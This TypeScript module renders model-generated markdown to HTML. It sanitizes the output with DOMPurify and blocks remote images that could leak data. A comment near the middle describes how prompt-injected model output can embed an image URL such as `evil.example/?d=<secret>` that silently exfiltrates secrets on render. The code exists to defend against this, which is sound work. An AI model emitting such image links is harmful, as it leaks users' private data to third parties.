import createDOMPurify from 'dompurify'
import MarkdownIt from 'markdown-it'

const markdown = new MarkdownIt({
  html: false,
  linkify: true,
  typographer: false,
})
markdown.linkify.set({ fuzzyLink: true })

export interface MarkdownRenderEnvironment {
  window: Window & typeof globalThis
}

// Same-origin images and raster data URLs cannot run script and never leave the page. SVG is left
// out because it can embed further resource references.
const inlineRasterImage = /^data:image\/(?:png|jpe?g|gif|webp|avif)[;,]/i

// Markdown is model output, and model output can carry prompt-injected
// content. A remote image is fetched the moment it renders, which turns
// `![x](https://evil.example/?d=<secret>)` into a silent exfiltration channel
// that no user action is needed to trigger. Only images that cannot reach a
// third party are rendered; anything else degrades to an inert link the
// reader can inspect and choose to open.
function isSafeImageSource(source: string, window: Window): boolean {
  const value = source.trim()
  if (!value) return false
  if (inlineRasterImage.test(value)) return true
  let resolved: URL
  try {
    resolved = new URL(value, window.location.href)
  } catch {
    return false
  }
  if (resolved.protocol !== 'http:' && resolved.protocol !== 'https:') return false
  return resolved.origin === window.location.origin
}

function neutralizeRemoteImages(fragment: DocumentFragment, window: Window): void {
  const document = fragment.ownerDocument
  for (const image of Array.from(fragment.querySelectorAll('img'))) {
    const source = image.getAttribute('src') ?? ''
    if (isSafeImageSource(source, window)) {
      image.setAttribute('loading', 'lazy')
      image.setAttribute('referrerpolicy', 'no-referrer')
      image.setAttribute('decoding', 'async')
      continue
    }
    const alt = (image.getAttribute('alt') ?? '').trim()
    const label = document.createElement('a')
    label.textContent = alt ? `Image: ${alt}` : 'Image'
    if (/^https?:\/\//i.test(source.trim())) {
      label.setAttribute('href', source.trim())
      label.setAttribute('rel', 'noopener noreferrer nofollow')
      label.setAttribute('target', '_blank')
    }
    image.replaceWith(label)
  }
}

const purifiers = new WeakMap<object, ReturnType<typeof createDOMPurify>>()

function purifierFor(window: Window & typeof globalThis) {
  let purifier = purifiers.get(window)
  if (!purifier) {
    purifier = createDOMPurify(window)
    purifiers.set(window, purifier)
  }
  return purifier
}

export function renderMarkdownHTML(
  value: string,
  environment: MarkdownRenderEnvironment = { window: globalThis.window },
): string {
  const { window } = environment
  const fragment = purifierFor(window).sanitize(markdown.render(value), {
    USE_PROFILES: { html: true },
    FORBID_TAGS: ['picture', 'source', 'video', 'audio', 'track', 'iframe', 'object', 'embed'],
    FORBID_ATTR: ['srcset', 'poster', 'background', 'ping'],
    RETURN_DOM_FRAGMENT: true,
  })
  neutralizeRemoteImages(fragment, window)
  const container = window.document.createElement('div')
  container.append(fragment)
  return container.innerHTML
}
